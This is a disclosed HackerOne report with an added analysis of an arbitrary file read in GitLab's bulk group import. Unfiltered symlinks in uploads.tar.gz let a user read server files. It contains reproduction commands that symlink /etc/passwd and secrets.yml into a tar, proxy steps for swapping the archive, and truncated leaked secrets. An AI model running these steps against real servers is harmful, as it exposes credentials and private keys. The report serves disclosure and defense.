# Arbitrary File Read via Bulk Imports UploadsPipeline Symlink Handling

## Metadata
- **Source:** HackerOne
- **Report:** 1439593 | https://hackerone.com/reports/1439593
- **Submitted:** 2022-01-03
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Arbitrary File Read, Path Traversal, Insecure Deserialization (Tar Extraction), Symlink Following
- **CVEs:** None
- **Category:** uncategorised

## Summary
The bulk imports API fails to remove or filter symlinks when extracting uploads.tar.gz files, allowing authenticated users to read arbitrary files accessible by the GitLab process. An attacker can craft a malicious tar archive containing symlinks to sensitive files like /etc/passwd or secrets.yml, which are then followed during the import process and made accessible via the web interface.

## Attack scenario
1. Attacker creates a legitimate group with an uploaded file to identify the upload directory hash
2. Attacker crafts a malicious uploads.tar.gz containing symlinks to sensitive files (e.g., /etc/passwd, /srv/gitlab/config/secrets.yml)
3. Attacker intercepts or replaces the legitimate uploads.tar.gz using a proxy during a group import operation
4. Attacker initiates a group import targeting their own group, providing the URL to their malicious tar file
5. The UploadsPipeline extracts the tar without filtering symlinks, adding them to the file paths list
6. Attacker accesses the imported group and downloads the symlinked files, reading arbitrary sensitive data

## Root cause
The `untar_zxf` method in UploadsPipeline only changes file permissions but does not remove or filter symlinks before processing. The `load` method subsequently follows these symlinks when opening files with `File.open(file_path, 'r')`, allowing arbitrary file reads. The code lacks the symlink validation/removal that exists in the project import pipeline.

## Attacker mindset
An authenticated user with group import privileges seeks to exfiltrate sensitive configuration data (secrets, credentials, keys) from the GitLab server. They recognize that tar extraction is inherently dangerous when symlinks are not sanitized, and exploit the bulk imports feature as an attack vector to gain file system read access.

## Defensive takeaways
- Always validate and sanitize extracted archive contents before processing, explicitly removing or rejecting symlinks
- Use safe tar extraction methods that prevent symlink traversal (tar options like --no-same-owner, or post-extraction validation)
- Implement consistent symlink handling across all import pipelines (audit for similar issues in project imports, etc.)
- Apply principle of least privilege to the Git/GitLab process filesystem permissions
- Validate file types and paths against a whitelist before opening and processing extracted files
- Add security checks to detect and block suspicious archive contents (symlinks to /etc, /srv, etc.)
- Implement file descriptor-based operations instead of path-based to prevent symlink following
- Add audit logging for archive imports and file access during import operations

## Variant hunting
Check all other pipeline classes inheriting from BulkImports::Pipeline for similar symlink handling vulnerabilities
Search for other uses of `untar_zxf` or tar extraction without symlink filtering
Audit project import pipelines for similar but differently exploitable symlink issues
Examine other import features (repositories, wikis, attachments) for tar extraction without validation
Check if hardlinks or other special files bypass intended security controls
Test zip extraction functionality for similar path traversal issues
Review permissions on extracted files and whether they could be exploited in race conditions

## MITRE ATT&CK
- T1190
- T1552.007
- T1083
- T1040
- T1574.008
- T1566.002

## Notes
The researcher demonstrated the attack with a working proof-of-concept including a proxy server to intercept and replace the tar file. The vulnerability required authenticated access with group import privileges but no special permissions beyond that. The impact includes disclosure of system files (/etc/passwd) and critical application secrets (secrets.yml containing encryption keys, OTP bases, and RSA private keys). The fix likely involved adding symlink detection and removal similar to existing protections in project imports.

## Full report
<details><summary>Expand</summary>

### Summary

The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group.

When a group has uploads (such as markdown attachments), an `uploads.tar.gz` file will be downloaded and extracted in the `UploadsPipeline`:
https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L15
```ruby
       def extract(context)
          download_service(tmp_dir, context).execute
          untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)
          upload_file_paths = Dir.glob(File.join(tmp_dir, '**', '*'))

          BulkImports::Pipeline::ExtractedData.new(data: upload_file_paths)
        end
```

Since `untar_zxf` only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When `load` is called, the symlinks will be followed and used as the content for the new file:

https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L23
```ruby
        def load(context, file_path)
          avatar_path = AVATAR_PATTERN.match(file_path)

          return save_avatar(file_path) if avatar_path

          dynamic_path = file_uploader.extract_dynamic_path(file_path)

          return unless dynamic_path
          return if File.directory?(file_path)

          named_captures = dynamic_path.named_captures.symbolize_keys

          UploadService.new(context.portable, File.open(file_path, 'r'), file_uploader, **named_captures).execute
        end
``` 

This can be used to read any file that the git user has read access to such as secrets.yml or other sensitive files.

### Steps to reproduce

1. Create a new group on gitlab.com
1. Create a new milestone and upload a file `passwd` with any content into the description
1. Make note of the upload secret (the 32 byte hash in the path)
1. Run the following commands to make a tar file, using the hash from above
    ```bash
mkdir ./d3209c811fee407218bff7cb3b4333e6
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
tar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6
    ```

1. Save the following simple proxy server as `api.py` and run it with `FLASK_APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789}
1. Start [ngrok](https://ngrok.com/) so that it's externally accessible: `ngrok http 5000`
1. Create a new access token at https://gitlab.com/-/profile/personal_access_tokens
1. Create a new group, this time choose import group
1. Enter the https ngrok url and the token you just created
1. Select the group you initially created and choose a new name
1. Once the import has complete, view the milestone and click the passwd link
1. You will see the passwd file from the gitlab server
1. Copy the link and change `passwd` to `secrets.yml` and you should be able to download the secrets file


### Impact

A user with access to import a group on gitlab can read arbitrary files on the gitlab server

### Examples

Example with `passwd` and `secrets.yml` attached:
https://gitlab.com/groups/group_to_import_1/-/milestones/1
https://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/passwd
https://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/secrets.yml

### What is the current *bug* behavior?
Symlinks are not removed or filtered when the `UploadsPipeline` is run for the bulk imports api

### What is the expected *correct* behavior?
Symlinks should be removed similar to the project import

### Relevant logs and/or screenshots
/etc/passwd file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
git:x:1000:1000:GitLab,,,:/home/git:/bin/bash
```

/srv/gitlab/config/secrets.yml file:
```yaml
production:
  secret_key_base: 1174116b6adee.....
  otp_key_base: staging-a680efdeb2e93751f32.....
  db_key_base: 1174116b6adee59.....
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKQIBAAKCAgEA5RyvCSgBoOGNE03CMcJ9.....
    -----END RSA PRIVATE KEY-----
  ci_jwt_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAvazHHoAHZB5j9RUyq0CEK9.....
    -----END RSA PRIVATE KEY-----


### Output of checks
This bug happens on GitLab.com

## Impact

A user with access to import a group on gitlab can read arbitrary files on the gitlab server

</details>

---
*Analysed by Claude on 2026-05-11*
